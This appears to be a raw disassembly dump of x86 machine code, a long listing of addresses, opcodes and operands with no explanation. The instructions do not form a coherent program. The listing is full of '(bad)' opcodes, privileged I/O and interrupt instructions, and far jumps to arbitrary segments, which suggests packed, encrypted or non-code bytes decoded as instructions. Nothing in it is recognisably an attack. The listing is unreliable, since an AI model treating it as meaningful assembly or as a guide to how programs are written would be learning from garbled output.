  40f591:	(bad)  
  40f592:	push   ebp
  40f593:	push   ecx
  40f594:	cli    
  40f595:	cli    
  40f596:	call   0x2870a36f
  40f59b:	into   
  40f59c:	or     ah,BYTE PTR [ebx+0x379f6cf0]
  40f5a2:	inc    eax
  40f5a3:	mov    ah,0xda
  40f5a5:	mov    al,0x3f
  40f5a7:	inc    esi
  40f5a8:	retf   
  40f5a9:	dec    ebx
  40f5aa:	mov    dl,0x18
  40f5ac:	xchg   DWORD PTR [esi+edx*2+0x21],ebp
  40f5b0:	repnz pusha 
  40f5b2:	push   ebx
  40f5b3:	sbb    eax,0xd490e2f9
  40f5b8:	sub    esi,eax
  40f5ba:	cmc    
  40f5bb:	jno    0x40f614
  40f5bd:	cli    
  40f5be:	enter  0x3d75,0x31
  40f5c2:	fdiv   QWORD PTR ds:0x603bb619
  40f5c8:	cmp    al,BYTE PTR [edi]
  40f5ca:	fucom  st(7)
  40f5cc:	add    dh,BYTE PTR ds:0xc78002b6
  40f5d2:	jne    0x40f650
  40f5d4:	ror    BYTE PTR cs:[eax],cl
  40f5d7:	das    
  40f5d8:	jmp    0x2681:0x2910a5af
  40f5df:	enter  0xb5ec,0xac
  40f5e3:	mov    bh,0x1b
  40f5e5:	push   0xffffffc7
  40f5e7:	mov    WORD PTR [esi],?
  40f5e9:	scas   eax,DWORD PTR es:[edi]
  40f5ea:	mov    edi,0x367c1a0e
  40f5ef:	xor    dh,BYTE PTR [eax]
  40f5f1:	mov    ecx,0xf7efa27e
  40f5f6:	inc    ebx
  40f5f7:	imul   esp,esi,0xffffffd1
  40f5fa:	test   al,0x28
  40f5fc:	and    eax,0xc7ef4187
  40f601:	pop    ebx
  40f602:	mov    BYTE PTR [ecx+0x166d3818],ch
  40f608:	sub    eax,0xaac1a4db
  40f60d:	in     eax,0x52
  40f60f:	test   DWORD PTR [ebp-0x19],0xd40637ba
  40f616:	and    BYTE PTR [ebp+0x1d8b8b15],dh
  40f61c:	xchg   esi,eax
  40f61d:	dec    ecx
  40f61e:	mov    BYTE PTR [edi],bh
  40f620:	retf   
  40f621:	loop   0x40f5c8
  40f623:	pop    edx
  40f624:	and    bl,BYTE PTR [ebp+0x58]
  40f627:	call   0x3b8f:0x1047f20a
  40f62e:	int3   
  40f62f:	jmp    0x40f601
  40f631:	sub    DWORD PTR [eax+0x32],esi
  40f634:	fstp   TBYTE PTR [eax-0x2e]
  40f637:	and    DWORD PTR [edi-0x63102c80],0x31
  40f63e:	push   ebx
  40f63f:	(bad)  
  40f640:	into   
  40f641:	stos   DWORD PTR es:[edi],eax
  40f642:	cld    
  40f643:	jb     0x40f6bd
  40f645:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f646:	jg     0x40f645
  40f648:	sbb    eax,0x5073059f
  40f64d:	and    eax,0xf039d8de
  40f652:	das    
  40f653:	mov    WORD PTR [edx+ebp*2-0x2e],fs
  40f657:	dec    edi
  40f658:	hlt    
  40f659:	mov    ecx,0xd60bb62f
  40f65e:	adc    al,0x1
  40f660:	cld    
  40f661:	pop    es
  40f662:	in     al,dx
  40f663:	jb     0x40f65e
  40f665:	adc    ebp,ecx
  40f667:	fcmovu st,st(6)
  40f669:	jns    0x40f5eb
  40f66b:	addr16 xchg esi,eax
  40f66d:	and    dh,ah
  40f66f:	loopne 0x40f646
  40f671:	icebp  
  40f672:	sti    
  40f673:	sbb    edx,esp
  40f675:	aaa    
  40f676:	and    al,0xef
  40f678:	xchg   esi,eax
  40f679:	mov    esi,DWORD PTR [esi]
  40f67b:	gs push ds
  40f67d:	jle    0x40f6ca
  40f67f:	mov    edi,0x5db3d565
  40f684:	clc    
  40f685:	pop    ebx
  40f686:	ds adc al,0x89
  40f689:	sbb    BYTE PTR [esi-0x3194b898],0x1d
  40f690:	dec    edx
  40f691:	(bad)  
  40f692:	imul   edi,DWORD PTR [edi-0x7c7f69a0],0x7
  40f699:	stos   DWORD PTR es:[edi],eax
  40f69a:	aaa    
  40f69b:	fmul   DWORD PTR [eax-0x67b0147f]
  40f6a1:	inc    esi
  40f6a2:	jmp    0x40f65d
  40f6a4:	push   ebp
  40f6a5:	xchg   edx,eax
  40f6a7:	add    BYTE PTR [ecx-0x31],ah
  40f6aa:	lods   eax,DWORD PTR ds:[esi]
  40f6ab:	pop    esp
  40f6ac:	fiadd  DWORD PTR [edi-0x63873a84]
  40f6b2:	fwait
  40f6b3:	inc    edx
  40f6b4:	fcom   QWORD PTR [ebx-0x2adaea66]
  40f6ba:	cmp    bh,BYTE PTR [eax+ecx*1+0x3]
  40f6be:	and    ch,al
  40f6c0:	mov    ch,0x24
  40f6c2:	sub    ebx,DWORD PTR [esi]
  40f6c4:	sub    al,bl
  40f6c6:	test   BYTE PTR [edx],cl
  40f6c8:	je     0x40f6ec
  40f6ca:	mov    cl,0x98
  40f6cc:	mov    bh,0xb8
  40f6ce:	or     al,0x35
  40f6d0:	jl     0x40f732
  40f6d2:	loopne 0x40f6d9
  40f6d4:	jne    0x40f745
  40f6d6:	or     al,0x0
  40f6d8:	test   BYTE PTR [edx],bl
  40f6da:	jo     0x40f726
  40f6dc:	jmp    0xcf7:0xf0904896
  40f6e3:	imul   ebx,DWORD PTR ds:0xa78e4db2,0xffffffb9
  40f6ea:	imul   esp,DWORD PTR [ecx+eiz*8+0x17e61759],0x75cc198f
  40f6f5:	lods   al,BYTE PTR ds:[esi]
  40f6f6:	pop    esp
  40f6f7:	dec    ecx
  40f6f8:	std    
  40f6f9:	jno    0x40f776
  40f6fb:	pop    edx
  40f6fc:	cmp    ecx,DWORD PTR [ebx+0x37104624]
  40f702:	pusha  
  40f703:	imul   edi,DWORD PTR [edx+0x1cb986],0xd744dcb5
  40f70d:	cdq    
  40f70e:	imul   ebp,eax,0x60
  40f711:	ds mov dh,0x2
  40f714:	int    0x43
  40f716:	loop   0x40f786
  40f718:	std    
  40f719:	daa    
  40f71a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f71b:	es pop ecx
  40f71d:	hlt    
  40f71e:	popa   
  40f71f:	lock adc esp,esp
  40f722:	jne    0x40f740
  40f724:	imul   ecx,DWORD PTR [ebp+0x73],0x5fbbca6d
  40f72b:	scas   al,BYTE PTR es:[edi]
  40f72c:	sbb    eax,0x7a6303e4
  40f731:	outs   dx,BYTE PTR ds:[esi]
  40f732:	ja     0x40f757
  40f734:	push   ebp
  40f735:	mov    al,ds:0x6ad83570
  40f73a:	sar    DWORD PTR [ebx+0x7fafd913],cl
  40f740:	sbb    eax,0x21f752ec
  40f745:	into   
  40f746:	xor    DWORD PTR [edi-0x6b],esi
  40f749:	sbb    eax,DWORD PTR [eax-0xc]
  40f74c:	cwde   
  40f74d:	arpl   WORD PTR [ecx-0x13967548],di
  40f753:	cdq    
  40f754:	adc    ebx,DWORD PTR [eax+eiz*8-0x4030d727]
  40f75b:	jle    0x40f73f
  40f75d:	mov    ch,0x9e
  40f75f:	test   eax,0xf2f087d2
  40f764:	(bad)  
  40f766:	jo     0x40f780
  40f768:	sti    
  40f769:	sub    al,0xaf
  40f76b:	test   ecx,edx
  40f76d:	imul   ebx,DWORD PTR [bp+si],0xc1a8afd8
  40f774:	and    DWORD PTR [ebp-0x51],ebx
  40f777:	lock out 0xc4,eax
  40f77a:	mov    ah,0xa0
  40f77c:	(bad)  
  40f77d:	pop    edi
  40f77e:	pop    esp
  40f77f:	sub    DWORD PTR [edx-0x3f8c5186],esp
  40f785:	dec    ebx
  40f786:	rcl    DWORD PTR [ecx+0x64],0x7c
  40f78a:	aaa    
  40f78b:	mov    cl,0x76
  40f78d:	and    DWORD PTR [ecx-0x188e58d6],edx
  40f793:	pop    esp
  40f794:	int    0xa7
  40f796:	cli    
  40f797:	pushf  
  40f798:	(bad)  
  40f79b:	test   eax,0x9d6c7846
  40f7a0:	bound  ebx,QWORD PTR [edx+ebp*1+0x3]
  40f7a4:	int    0x7c
  40f7a6:	cld    
  40f7a7:	xchg   ebx,eax
  40f7a8:	and    al,0x62
  40f7aa:	push   ebx
  40f7ab:	mov    ch,0xc6
  40f7ad:	test   eax,0x26a3d295
  40f7b2:	stc    
  40f7b3:	add    DWORD PTR [esi-0x60e2fc93],edi
  40f7b9:	push   edi
  40f7ba:	mov    cl,bh
  40f7bc:	jbe    0x40f7b1
  40f7be:	loop   0x40f780
  40f7c0:	mov    eax,0x22ca2509
  40f7c5:	or     BYTE PTR [ebp-0x43b907f6],0x3e
  40f7cc:	scas   eax,DWORD PTR es:[edi]
  40f7cd:	xchg   ebp,eax
  40f7ce:	push   esi
  40f7cf:	cmc    
  40f7d0:	push   ecx
  40f7d1:	cwde   
  40f7d2:	mov    ecx,DWORD PTR [eax]
  40f7d4:	fimul  DWORD PTR [ecx-0x723df1]
  40f7da:	add    bh,BYTE PTR [ecx]
  40f7dc:	and    eax,0x9d48b862
  40f7e1:	leave  
  40f7e2:	push   cs
  40f7e3:	and    ch,BYTE PTR [ebp-0xc]
  40f7e6:	push   ebx
  40f7e7:	addr16 fs test ch,dh
  40f7eb:	jmp    0xdc72:0x1f6fd4c6
  40f7f2:	es stos DWORD PTR es:[edi],eax
  40f7f4:	cmp    ch,ah
  40f7f6:	xor    BYTE PTR [edi],0xf1
  40f7f9:	lods   al,BYTE PTR ds:[esi]
  40f7fa:	xor    eax,0x90381018
  40f7ff:	mov    al,0x1c
  40f801:	xchg   esi,eax
  40f802:	adc    eax,0x9677b2d8
  40f807:	mov    esp,0xaa058fa7
  40f80c:	adc    al,0x84
  40f80e:	mov    ch,0x82
  40f810:	js     0x40f882
  40f812:	stc    
  40f813:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f814:	icebp  
  40f815:	sub    BYTE PTR ds:0x9ab2a09,0x14
  40f81c:	dec    eax
  40f81d:	or     dh,bl
  40f81f:	shr    DWORD PTR [edx-0x53a8aedf],1
  40f825:	test   eax,0x7d4f3817
  40f82a:	xchg   esp,eax
  40f82b:	mov    ebp,0xa577d15b
  40f830:	cmp    ah,al
  40f832:	jecxz  0x40f87c
  40f834:	fst    QWORD PTR [ebx-0x3570e9b2]
  40f83a:	or     al,0x31
  40f83c:	add    ch,al
  40f83e:	jle    0x40f883
  40f840:	bound  esi,QWORD PTR [edi+0x2f8411d8]
  40f846:	into   
  40f847:	(bad)  
  40f848:	fst    st(0)
  40f84a:	add    bl,ah
  40f84c:	arpl   bx,dx
  40f84e:	popa   
  40f84f:	mov    ch,0xd
  40f851:	push   ds
  40f852:	pop    ebp
  40f853:	sub    ah,ch
  40f855:	clc    
  40f856:	inc    eax
  40f857:	imul   edi,DWORD PTR [edi+0x7b577278],0x6f453260
  40f861:	(bad)  
  40f862:	jmp    0xe08f:0x39767c32
  40f869:	xor    cl,BYTE PTR [ecx]
  40f86b:	sbb    dh,BYTE PTR [esi-0x71b2689c]
  40f871:	cld    
  40f872:	and    dh,ch
  40f874:	out    0x7e,al
  40f876:	cmp    bh,ah
  40f878:	mov    bl,0xff
  40f87a:	pop    edx
  40f87b:	arpl   WORD PTR [ebp+ebx*1+0x69d4ce64],sp
  40f882:	xor    DWORD PTR [esi+0x185bcad3],edx
  40f888:	shr    BYTE PTR [ebx+ecx*8+0x31],0x44
  40f88d:	mov    bh,0x60
  40f88f:	(bad)  
  40f890:	stc    
  40f891:	repnz mov al,BYTE PTR [ecx-0x4b1a39bf]
  40f898:	push   ebx
  40f899:	cld    
  40f89a:	cmp    BYTE PTR [ecx+0x40],dl
  40f89d:	mov    dl,BYTE PTR [esi+0x62]
  40f8a0:	lods   eax,DWORD PTR ds:[esi]
  40f8a1:	cmp    edx,DWORD PTR [edx+0x6cfe35b5]
  40f8a7:	in     al,dx
  40f8a8:	test   al,ah
  40f8aa:	outs   dx,BYTE PTR ds:[esi]
  40f8ab:	mov    esi,DWORD PTR [ecx+0x5ac61185]
  40f8b1:	pop    edx
  40f8b2:	or     al,0x2a
  40f8b4:	or     eax,0xf815a52
  40f8b9:	retf   0x29ce
  40f8bc:	push   es
  40f8bd:	enter  0x7142,0x7b
  40f8c1:	lods   eax,DWORD PTR ds:[esi]
  40f8c2:	mov    edx,0x21ec88c6
  40f8c7:	mov    dh,0x6c
  40f8c9:	test   eax,0xd63faa28
  40f8ce:	hlt    
  40f8cf:	stos   DWORD PTR es:[edi],eax
  40f8d0:	test   BYTE PTR [ecx-0x5e],0xf
  40f8d4:	inc    esp
  40f8d5:	loop   0x40f875
  40f8d7:	push   edx
  40f8d8:	push   ebx
  40f8d9:	xchg   esi,eax
  40f8da:	loopne 0x40f8f4
  40f8dc:	mov    dh,ah
  40f8de:	ss aas 
  40f8e0:	add    ecx,DWORD PTR [ecx+0x26002835]
  40f8e6:	ja     0x40f87c
  40f8e8:	xor    DWORD PTR [esi+0x30],ebp
  40f8eb:	push   edx
  40f8ec:	cmp    eax,0x4a77ec9f
  40f8f1:	xchg   BYTE PTR [ecx-0x14548b0f],bh
  40f8f7:	jecxz  0x40f90a
  40f8f9:	test   BYTE PTR [esi],dh
  40f8fb:	call   0xc3efb103
  40f900:	loop   0x40f8f2
  40f902:	inc    DWORD PTR [esi-0x61118056]
  40f908:	cwde   
  40f909:	jp     0x40f8e7
  40f90b:	cmp    DWORD PTR ss:[esi-0xe],0xffffff91
  40f910:	lods   eax,DWORD PTR ds:[esi]
  40f911:	sub    al,0x52
  40f913:	push   eax
  40f914:	adc    ebx,ebp
  40f916:	cwde   
  40f917:	or     dh,BYTE PTR [edx+0x31474986]
  40f91d:	inc    edx
  40f91e:	mov    bh,0x66
  40f920:	test   DWORD PTR [edi+esi*2],esp
  40f923:	test   al,0xa1
  40f925:	or     eax,0xa687e391
  40f92a:	fldz   
  40f92c:	data16 bnd ja 0x40f902
  40f930:	jmp    0x15a1:0xfc4bbe8b
  40f937:	pushf  
  40f938:	in     eax,0xa6
  40f93a:	ror    BYTE PTR [ebp+0x9e4ae8f],0xc2
  40f941:	push   ebp
  40f942:	xor    ebp,DWORD PTR [edi+0x1e]
  40f945:	in     eax,0xfb
  40f947:	fwait
  40f948:	inc    ebx
  40f949:	pop    edi
  40f94a:	popf   
  40f94b:	(bad)  
  40f94c:	repz sub BYTE PTR [edi+0x280d8c1b],0x57
  40f954:	mov    al,ds:0xeac66571
  40f959:	sahf   
  40f95a:	mov    dl,0xbf
  40f95c:	retf   0xc7da
  40f95f:	pop    ecx
  40f960:	rcr    DWORD PTR [edx+0x15],0x57
  40f964:	and    ebp,DWORD PTR [edi-0x1e2c4d76]
  40f96a:	mov    ds:0x5800fc34,al
  40f96f:	or     DWORD PTR [ebp-0x264d511f],esp
  40f975:	ins    DWORD PTR es:[edi],dx
  40f976:	aaa    
  40f977:	ret    
  40f978:	cli    
  40f979:	xchg   ebx,eax
  40f97a:	mov    al,0xd0
  40f97c:	fwait
  40f97d:	mov    edx,0x9cf56a5
  40f982:	jecxz  0x40f925
  40f984:	test   al,0x2e
  40f986:	inc    esi
  40f987:	lock mov ah,0x88
  40f98a:	rcl    DWORD PTR [ebp+0x47],0x4d
  40f98e:	ret    0xc1ac
  40f991:	cmp    eax,0x84a5d1e6
  40f996:	mov    ch,al
  40f998:	aaa    
  40f999:	fimul  DWORD PTR [esi+edi*4+0x75]
  40f99d:	mov    ?,WORD PTR [ebx-0x37]
  40f9a0:	outs   dx,DWORD PTR ds:[esi]
  40f9a1:	jmp    0xd143:0x5eb5038c
  40f9a8:	imul   edi,DWORD PTR [edx+0x6d],0x301757d3
  40f9af:	mov    ch,0xf0
  40f9b1:	and    edi,esp
  40f9b3:	(bad)  
  40f9b4:	ficomp DWORD PTR ds:0xd185bdc4
  40f9ba:	dec    ebx
  40f9bb:	adc    al,0xb8
  40f9bd:	jns    0x40f980
  40f9bf:	(bad)  
  40f9c0:	jmp    DWORD PTR [ecx]
  40f9c2:	rcl    BYTE PTR [edi+0x793dab59],0xf1
  40f9c9:	daa    
  40f9ca:	shl    DWORD PTR [ebx],1
  40f9cc:	arpl   WORD PTR [edi],di
  40f9ce:	(bad)  
  40f9cf:	sbb    eax,0x5fab3bee
  40f9d4:	sbb    edx,DWORD PTR [edx]
  40f9d6:	in     al,0x77
  40f9d8:	imul   edi,DWORD PTR [esi+0x60],0x59
  40f9dc:	out    0xdc,eax
  40f9de:	cmp    dl,dl
  40f9e0:	and    dl,BYTE PTR [edi-0x6]
  40f9e3:	jle    0x40fa47
  40f9e5:	stc    
  40f9e6:	mov    al,ds:0x77862874
  40f9eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9ec:	xchg   ebp,eax
  40f9ed:	loop   0x40f985
  40f9ef:	retf   0x2fae
  40f9f2:	and    BYTE PTR [esi],0x62
  40f9f5:	sub    esi,DWORD PTR [esi-0x1b]
  40f9f8:	or     BYTE PTR [esi*2+0x70bb8eaa],bl
  40f9ff:	in     al,dx
  40fa00:	fst    QWORD PTR [edx+0x3f]
  40fa03:	fistp  QWORD PTR [edi-0x6a0f3c9]
  40fa09:	jo     0x40f9be
  40fa0b:	(bad)  
  40fa0c:	jmp    0x8c40:0xc3a783f4
  40fa13:	jbe    0x40f9bb
  40fa15:	add    ebp,DWORD PTR [edi-0x41]
  40fa18:	fbld   TBYTE PTR [ecx]
  40fa1a:	or     al,0xe8
  40fa1c:	sar    al,cl
  40fa1e:	pop    ss
  40fa1f:	xor    eax,0xdf57b9a2
  40fa24:	lds    edi,FWORD PTR [ebx]
  40fa26:	(bad)  
  40fa27:	jae    0x40f9e5
  40fa29:	mov    ah,0xae
  40fa2b:	mov    esi,0x944b8cd1
  40fa30:	ret    0xad2d
  40fa33:	rcl    DWORD PTR ds:0xd3dece04,1
  40fa39:	mov    eax,ecx
  40fa3b:	in     eax,0xc2
  40fa3d:	shr    BYTE PTR ds:0xbf998585,1
  40fa43:	and    DWORD PTR [eax+eiz*8+0x4],0x5f2eda20
  40fa4b:	push   edi
  40fa4c:	cmp    ebx,DWORD PTR [ebx]
  40fa4e:	sbb    BYTE PTR [eax+esi*1-0x4b],cl
  40fa52:	mov    WORD PTR [esp+edx*1],ss
  40fa55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa56:	in     eax,dx
  40fa57:	jo     0x40fa2d
  40fa59:	imul   ebp,DWORD PTR [ecx+0x73620ade],0xc
  40fa60:	jge    0x40fa09
  40fa62:	xor    cl,BYTE PTR [esi]
  40fa64:	inc    eax
  40fa65:	fst    DWORD PTR [edi-0x11c2b24f]
  40fa6b:	push   esp
  40fa6c:	stos   DWORD PTR es:[edi],eax
  40fa6d:	dec    edi
  40fa6e:	ss cmp cl,0xb5
  40fa72:	gs cdq 
  40fa74:	pop    edx
  40fa75:	inc    edx
  40fa76:	pop    edx
  40fa77:	mov    db7,edx
  40fa7a:	aaa    
  40fa7b:	loop   0x40fabb
  40fa7d:	mov    edi,DWORD PTR [ecx]
  40fa7f:	mov    ah,0x2e
  40fa81:	je     0x40faa9
  40fa83:	mov    bl,0x75
  40fa85:	iret   
  40fa86:	push   ds
  40fa87:	mov    dh,0x5a
  40fa89:	lods   al,BYTE PTR ds:[esi]
  40fa8a:	call   0xb6ed:0x2e303c4b
  40fa91:	out    dx,al
  40fa92:	rcr    DWORD PTR [eax+edi*2+0x3f],0xe5
  40fa97:	add    bl,BYTE PTR [edx-0x5d]
  40fa9a:	out    dx,al
  40fa9b:	jl     0x40faa4
  40fa9d:	sub    BYTE PTR [esi+edx*8],bh
  40faa0:	xor    ecx,ebx
  40faa2:	add    eax,0x45277a2
  40faa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40faa8:	(bad)  [eax+0x5a]
  40faab:	sub    al,0x79
  40faad:	adc    DWORD PTR [eax-0xdda43b4],ebx
  40fab3:	aad    0xf9
  40fab5:	and    eax,0x9ea31701
  40faba:	push   edi
  40fabb:	inc    eax
  40fabc:	into   
  40fabd:	fdiv   QWORD PTR [esi-0x27d9b1ea]
  40fac3:	pop    eax
  40fac4:	into   
  40fac5:	shl    BYTE PTR [edi-0x5b],1
  40fac8:	push   0xffffff82
  40faca:	mov    edi,0x88600eb5
  40facf:	scas   al,BYTE PTR es:[edi]
  40fad0:	(bad)  
  40fad1:	mov    dh,0xd0
  40fad3:	or     esp,DWORD PTR [esi]
  40fad5:	jle    0x40fb22
  40fad7:	sub    al,0xf5
  40fad9:	retf   
  40fada:	cmp    al,0x4b
  40fadc:	cmc    
  40fadd:	aam    0x12
  40fadf:	push   es
  40fae0:	loop   0x40fb44
  40fae2:	ins    DWORD PTR es:[edi],dx
  40fae3:	xor    DWORD PTR [edx],ecx
  40fae5:	loopne 0x40fadd
  40fae7:	test   al,0x55
  40fae9:	fidiv  DWORD PTR [esi-0x72]
  40faec:	lahf   
  40faed:	popa   
  40faee:	push   ebx
  40faef:	(bad)  
  40faf0:	adc    al,BYTE PTR [esi]
  40faf2:	jecxz  0x40fb56
  40faf4:	jmp    0xa7e1:0xf9f0fbda
  40fafb:	mov    ds:0xcc733af7,eax
  40fb00:	push   esp
  40fb01:	mov    eax,0x9938edf9
  40fb06:	jns    0x40fb02
  40fb08:	sbb    BYTE PTR [edi],ch
  40fb0a:	loope  0x40fb1d
  40fb0c:	sti    
  40fb0d:	das    
  40fb0e:	inc    ebp
  40fb0f:	out    0x3,al
  40fb11:	inc    ebx
  40fb12:	loopne 0x40fb29
  40fb14:	push   edx
  40fb15:	adc    eax,0x6f99ac01
  40fb1a:	scas   al,BYTE PTR es:[edi]
  40fb1b:	dec    ebp
  40fb1c:	(bad)  
  40fb1d:	(bad)  
  40fb1e:	inc    ebx
  40fb20:	adc    BYTE PTR [ecx-0x72],dh
  40fb23:	mov    edi,0x3649d47b
  40fb28:	scas   eax,DWORD PTR es:[edi]
  40fb29:	test   BYTE PTR [eax],al
  40fb2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb2c:	rol    esi,cl
  40fb2e:	retf   0xb798
  40fb31:	in     eax,dx
  40fb32:	push   es
  40fb33:	imul   esi,DWORD PTR [ebx],0xffffffa9
  40fb36:	adc    al,0x4f
  40fb38:	push   ds
  40fb39:	xchg   ebx,eax
  40fb3a:	nop
  40fb3b:	les    ebx,FWORD PTR [edi+0x68d4a428]
  40fb41:	ins    DWORD PTR es:[edi],dx
  40fb42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb43:	sar    BYTE PTR [ebx+0x2e],1
  40fb46:	mov    bh,0x5a
  40fb48:	mov    ebx,0xd23bb04a
  40fb4e:	xchg   esp,eax
  40fb4f:	fnstcw WORD PTR [edx]
  40fb51:	mov    esp,0x6925d630
  40fb56:	scas   al,BYTE PTR es:[edi]
  40fb57:	mov    ds:0x4af88316,al
  40fb5c:	mov    fs,WORD PTR [ecx-0x50]
  40fb5f:	xchg   ebp,eax
  40fb60:	test   eax,0x170f419b
  40fb65:	dec    DWORD PTR [ebp+0x1a]
  40fb68:	in     al,dx
  40fb69:	mov    ch,0x48
  40fb6b:	sub    BYTE PTR [ebp-0x480bc30a],bh
  40fb71:	ins    DWORD PTR es:[edi],dx
  40fb72:	bound  ecx,QWORD PTR [eax-0x20]
  40fb75:	leave  
  40fb76:	fbld   TBYTE PTR [edx-0x4dc06e39]
  40fb7c:	imul   ebp,DWORD PTR [esi-0x5b],0x7f8fa730
  40fb83:	sti    
  40fb84:	aad    0x9f
  40fb86:	mov    eax,ds:0xd462a0f3
  40fb8b:	cwde   
  40fb8c:	outs   dx,BYTE PTR ds:[esi]
  40fb8d:	int    0x2a
  40fb8f:	pop    ss
  40fb90:	jmp    0xcd69acc6
  40fb95:	call   0xa6bc0fe
  40fb9a:	inc    eax
  40fb9b:	out    dx,eax
  40fb9c:	outs   dx,DWORD PTR ds:[esi]
  40fb9d:	sub    BYTE PTR [ebp+0x6516feec],0x36
  40fba4:	out    0x8f,eax
  40fba6:	or     al,0x62
  40fba8:	(bad)  
  40fba9:	adc    edi,DWORD PTR [edx]
  40fbab:	xor    al,BYTE PTR [edi+0x530c89fd]
  40fbb1:	in     al,0xd3
  40fbb3:	push   ebp
  40fbb4:	cld    
  40fbb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbb6:	push   0x6b
  40fbb8:	xor    al,0x31
  40fbba:	adc    cl,al
  40fbbc:	fs xchg esp,eax
  40fbbe:	pop    esp
  40fbbf:	cmp    esi,DWORD PTR [esi-0x5f032889]
  40fbc5:	mov    ds:0x9aea4956,eax
  40fbca:	fwait
  40fbcb:	inc    esp
  40fbcc:	xchg   edx,eax
  40fbcd:	in     al,dx
  40fbce:	or     eax,0xe20a1ab2
  40fbd3:	dec    edi
  40fbd4:	dec    eax
  40fbd5:	sbb    cl,BYTE PTR [edi]
  40fbd7:	jge    0x40fc50
  40fbd9:	mov    dh,0x61
  40fbdb:	ret    
  40fbdc:	aaa    
  40fbdd:	cmp    ebp,DWORD PTR [eax]
  40fbdf:	ret    
  40fbe0:	push   ds
  40fbe1:	or     ebp,DWORD PTR [ebx-0x49301fef]
  40fbe7:	pop    ss
  40fbe8:	ret    
  40fbe9:	stc    
  40fbea:	stc    
  40fbeb:	xchg   ebx,eax
  40fbec:	dec    esp
  40fbed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbee:	std    
  40fbef:	cmp    cl,BYTE PTR [esi+0x57bfb4e5]
  40fbf5:	cs jmp 0x40fc1c
  40fbf8:	mov    DWORD PTR [ebp-0x3f232bca],esi
  40fbfe:	ret    
  40fbff:	push   eax
  40fc00:	arpl   WORD PTR gs:[eax+ecx*4],di
  40fc04:	dec    esi
  40fc05:	bound  ebp,QWORD PTR [ebx]
  40fc07:	pop    bp
  40fc09:	add    DWORD PTR [edi],edx
  40fc0b:	xchg   esi,eax
  40fc0c:	jmp    0x40fbba
  40fc0e:	push   ebp
  40fc0f:	mov    esi,0x4604a07
  40fc14:	or     eax,0xb7675923
  40fc19:	cs pop es
  40fc1b:	lock push edx
  40fc1d:	push   edx
  40fc1e:	fs sbb eax,0x8570af87
  40fc24:	imul   esp,DWORD PTR [ecx],0x4d
  40fc27:	or     DWORD PTR [ecx-0x44],ebp
  40fc2a:	fs test eax,0x2a2f235e
  40fc30:	sbb    ecx,DWORD PTR [ebp+0x2e]
  40fc33:	or     eax,0xc974d48e
  40fc38:	int3   
  40fc39:	xor    DWORD PTR [edi+0x6b958c5d],ebp
  40fc3f:	inc    esi
  40fc40:	das    
  40fc41:	sbb    al,0xb
  40fc43:	std    
  40fc44:	xchg   BYTE PTR [ebp+0x7716bbac],dl
  40fc4a:	scas   eax,DWORD PTR es:[edi]
  40fc4b:	cmp    esi,0x96e45b5f
  40fc51:	push   0xffffffa8
  40fc53:	sahf   
  40fc54:	sbb    BYTE PTR ds:0xa67cb8b9,ah
  40fc5a:	xor    BYTE PTR [ecx+0x22b8a4ac],bl
  40fc60:	ins    BYTE PTR es:[edi],dx
  40fc61:	pop    ecx
  40fc62:	mov    al,ds:0x2a3e1e3d
  40fc67:	jl     0x40fce1
  40fc69:	dec    esp
  40fc6a:	mov    eax,ds:0x841a9ae
  40fc6f:	lahf   
  40fc70:	adc    DWORD PTR [edx],0x72d28bb3
  40fc76:	fwait
  40fc77:	idiv   BYTE PTR [ebx-0x47fad4d6]
  40fc7d:	xchg   ebp,eax
  40fc7e:	out    0xbc,eax
  40fc80:	rol    DWORD PTR [ebx+edx*1+0xd],1
  40fc84:	imul   esp,edi,0x6eef5817
  40fc8a:	jle    0x40fc75
  40fc8c:	(bad)  
  40fc8d:	push   0x367d113e
  40fc92:	ja     0x40fcbd
  40fc94:	test   eax,0x438054dc
  40fc99:	mov    ds:0x333174f8,eax
  40fc9e:	fbld   TBYTE PTR ds:0xaa206f29
  40fca4:	cmp    al,BYTE PTR [ebx+0x1e]
  40fca7:	push   0xffffff86
  40fca9:	mov    bh,0xee
  40fcab:	sti    
  40fcac:	mov    ch,0xf3
  40fcae:	xchg   esp,eax
  40fcaf:	bound  eax,QWORD PTR [edx+0x42]
  40fcb2:	jmp    0x8004:0x95d98dbd
  40fcb9:	adc    cl,cl
  40fcbb:	xchg   esp,eax
  40fcbc:	sbb    bh,BYTE PTR [ecx+0x7d9512ea]
  40fcc2:	ret    0x6826
  40fcc5:	adc    eax,0x2d451a8d
  40fcca:	mov    ch,0xce
  40fccc:	stos   BYTE PTR es:[edi],al
  40fccd:	jnp    0x40fd28
  40fccf:	data16 mov WORD PTR [ebx-0x4a],cs
  40fcd3:	xchg   DWORD PTR [esi+esi*1],eax
  40fcd6:	cwde   
  40fcd7:	ror    BYTE PTR [ebp+0x572598fd],1
  40fcdd:	and    ebx,DWORD PTR [ecx-0x57]
  40fce0:	pop    eax
  40fce1:	nop
  40fce2:	push   0x7e24d3b1
  40fce7:	(bad)  
  40fce8:	shl    ebp,cl
  40fcea:	das    
  40fceb:	mov    ecx,0x11012f5f
  40fcf0:	inc    ecx
  40fcf1:	(bad)  
  40fcf2:	cmc    
  40fcf3:	and    cl,BYTE PTR [edi+0x3c]
  40fcf6:	push   0x4ba39350
  40fcfb:	test   ah,cl
  40fcfd:	arpl   WORD PTR [edi+0x7c4b6ac0],ax
  40fd03:	data16 jne 0x40fd73
  40fd06:	push   ebp
  40fd07:	mov    dh,0xd7
  40fd09:	and    bl,BYTE PTR [ecx]
  40fd0b:	enter  0x9e53,0x45
  40fd0f:	adc    eax,0x2527620b
  40fd14:	jge    0x40fcb2
  40fd16:	xchg   ebx,eax
  40fd17:	fistp  WORD PTR [edx+ebx*8+0x173ebf7d]
  40fd1e:	ret    0x8a2d
  40fd21:	fwait
  40fd22:	je     0x40fd1a
  40fd24:	sub    al,0x3a
  40fd26:	cli    
  40fd27:	or     BYTE PTR [edx+0x2f533f0e],ch
  40fd2d:	es mov bl,0x31
